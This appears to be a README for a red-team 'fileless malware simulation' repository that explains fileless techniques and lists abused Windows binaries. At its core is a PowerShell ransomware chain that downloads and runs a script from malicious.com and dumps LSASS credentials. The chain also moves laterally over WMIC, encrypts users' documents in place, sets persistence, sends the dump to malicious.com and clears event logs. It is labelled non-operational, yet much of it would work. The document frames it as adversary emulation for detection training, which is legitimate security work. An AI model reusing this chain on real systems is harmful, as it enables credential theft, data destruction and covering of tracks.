
<div align="center">

# 🧠 **100% Fileless Malware Simulation**
> High-fidelity adversary emulation using in-memory execution and LOLBins

![License](https://img.shields.io/badge/license-MIT-black?style=flat-square)
![Status](https://img.shields.io/badge/build-simulation-lightgrey?style=flat-square)
![Scope](https://img.shields.io/badge/type-red_team-blue?style=flat-square)
![MITRE ATT&CK](https://img.shields.io/badge/framework-MITRE_ATT%26CK-red?style=flat-square)

</div>

---

## ❓ What Is Fileless Malware?

Fileless malware:
- Executes **entirely in RAM**
- Uses native OS tools like `PowerShell`, `rundll32`, and `WMIC`
- Reflectively injects into trusted processes
- Launches via macros, registry scripts, or LOLBins

🔒 **No files are written to disk**, making it hard to detect via signature-based AV.

---

## ✅ Is “100% Fileless” Achievable?

✔️ **Yes — in theory.**  
Chains can involve:
- Macro-based phishing
- [Reflective DLL Injection](https://attack.mitre.org/techniques/T1055/001/)
- Native binary abuse (LOLBins)
- No persistent files

⚠️ **In practice**:
- Temporary files or registry keys are often used
- Payloads live in memory
- Disk-based stubs may exist briefly

---

## 🔍 Why It Matters

- 🛡️ AV = file scanning → fails on memory-only payloads  
- 🧬 Fileless = increased stealth, dwell time, and forensic resistance  
- 🎯 Detection needs: EDRs, memory introspection, or behavioral analytics

---

## ⚠️ Legal & Ethical Use Only

This repository is for:
- Emulating **fileless threat behavior**
- Chaining [LOLBins](https://lolbas-project.github.io/)
- Simulating red/purple team adversarial tradecraft
- Safe adversary emulation in **isolated** environments

> 🔐 Use in **authorized labs only**

---

## ❌ Prohibited Usage

- 🚫 Unauthorized use is **illegal**
- 🚫 Not for real-world deployment
- 🚫 Authors **disclaim all liability**

---

## ✅ Usage Terms

By accessing this project, you confirm:
- You have **legal and ethical authorization**
- You operate in **controlled, sandboxed environments**
- You accept **full responsibility**

> ⚖️ Unsure about compliance? **Stop immediately** and consult legal authorities.

---

## 🔗 MITRE ATT&CK-Aligned PowerShell Simulation

> ⚠️ This is a **non-operational** emulation for training and detection tuning.

<details>
<summary>💥 Simulated Fileless Ransomware Chain</summary>

```powershell
# 🎯 [T1190](https://attack.mitre.org/techniques/T1190/) – Initial Access
$drop = "http://malicious.com/dropper.ps1"
IEX (New-Object Net.WebClient).DownloadString($drop)

# ⚡ [T1059.001](https://attack.mitre.org/techniques/T1059/001/) – PowerShell
$enc = "[Base64EncodedPayload]"
$bin = [System.Convert]::FromBase64String($enc)
[System.Reflection.Assembly]::Load($bin)

# 🔓 [T1548](https://attack.mitre.org/techniques/T1548/) – Privilege Escalation
Start-Process powershell -ArgumentList "-File elevate.ps1" -Verb RunAs

# 🧪 [T1003.001](https://attack.mitre.org/techniques/T1003/001/) – Credential Dumping
Invoke-Expression "rundll32 comsvcs.dll, MiniDump (Get-Process lsass).Id dump.dmp full"

# 🔍 [T1082](https://attack.mitre.org/techniques/T1082/) – Host Discovery
Get-WmiObject Win32_ComputerSystem | Select Name, Domain
Get-NetAdapter | Select Name, MacAddress

# 🌐 [T1021.001](https://attack.mitre.org/techniques/T1021/001/) – Lateral Movement
wmic /node:TargetPC process call create "powershell -File payload.ps1"

# 💣 [T1486](https://attack.mitre.org/techniques/T1486/) – Ransomware Impact
$docs = Get-ChildItem C:\Users\*\Documents -Include *.docx,*.txt -Recurse
foreach ($f in $docs) {
    $content = Get-Content $f.FullName -Raw
    $key = -join ((1..32) | ForEach { [char](Get-Random -Min 65 -Max 90) })
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [Text.Encoding]::UTF8.GetBytes($key.PadRight(32,'X'))
    $aes.IV = New-Object byte[] 16
    $enc = $aes.CreateEncryptor()
    $data = [Text.Encoding]::UTF8.GetBytes($content)
    $cipher = [Convert]::ToBase64String($enc.TransformFinalBlock($data, 0, $data.Length))
    Set-Content -Path $f.FullName -Value $cipher
}

# 📌 [T1547.001](https://attack.mitre.org/techniques/T1547/001/) – Persistence
Set-ItemProperty -Path "HKCU:\...\Run" -Name "Updater" -Value "powershell -File persist.ps1"
schtasks /create /tn "Updater" /tr "powershell -File persist.ps1" /sc onlogon /rl highest

# 📤 [T1041](https://attack.mitre.org/techniques/T1041/) – Exfiltration
$dump = [IO.File]::ReadAllBytes("dump.dmp")
Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method POST -Body ([Convert]::ToBase64String($dump))

# 🧹 [T1070](https://attack.mitre.org/techniques/T1070/) – Defense Evasion
Remove-Item C:\Windows\Temp\* -Force
wevtutil cl Security; wevtutil cl Application; wevtutil cl System
```

</details>

---

## 🧩 LOLBins (Living Off the Land Binaries)

| Binary            | Function                            | Techniques                                          |
|------------------|-------------------------------------|-----------------------------------------------------|
| `rundll32.exe`   | Reflective DLL execution             | [T1218.011](https://attack.mitre.org/techniques/T1218/011/), [T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
| `mshta.exe`      | HTA script execution                 | [T1218.005](https://attack.mitre.org/techniques/T1218/005/) |
| `regsvr32.exe`   | COM script loading                   | [T1218.010](https://attack.mitre.org/techniques/T1218/010/) |
| `wmic.exe`       | Remote execution, WMI abuse          | [T1047](https://attack.mitre.org/techniques/T1047/), [T1021.001](https://attack.mitre.org/techniques/T1021/001/) |
| `certutil.exe`   | Download/decode payloads             | [T1105](https://attack.mitre.org/techniques/T1105/), [T1140](https://attack.mitre.org/techniques/T1140/) |
| `msbuild.exe`    | Compile/execute C# payloads          | [T1127.001](https://attack.mitre.org/techniques/T1127/001/), [T1059.005](https://attack.mitre.org/techniques/T1059/005/) |
| `bitsadmin.exe`  | Background file transfer             | [T1105](https://attack.mitre.org/techniques/T1105/) |
| `schtasks.exe`   | Persistence via task scheduling      | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) |

---

## 📚 Resources

- 🔗 [LOLBAS Project](https://lolbas-project.github.io/)
- 🔗 [MITRE ATT&CK – T1218](https://attack.mitre.org/techniques/T1218/)
- 🔗 [DLL Injection Techniques](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
- 🔗 [LOLGEN Chain Generator](https://lolgen.hdks.org/)
- 🔗 [LOLOL Farm Sandbox](https://lolol.farm/)
- 🔗 [PrintNightmare Exploit Analysis](https://itm4n.github.io/printnightmare-not-over/)
- 🔗 [Wikipedia – Fileless Malware](https://en.wikipedia.org/wiki/Fileless_malware)
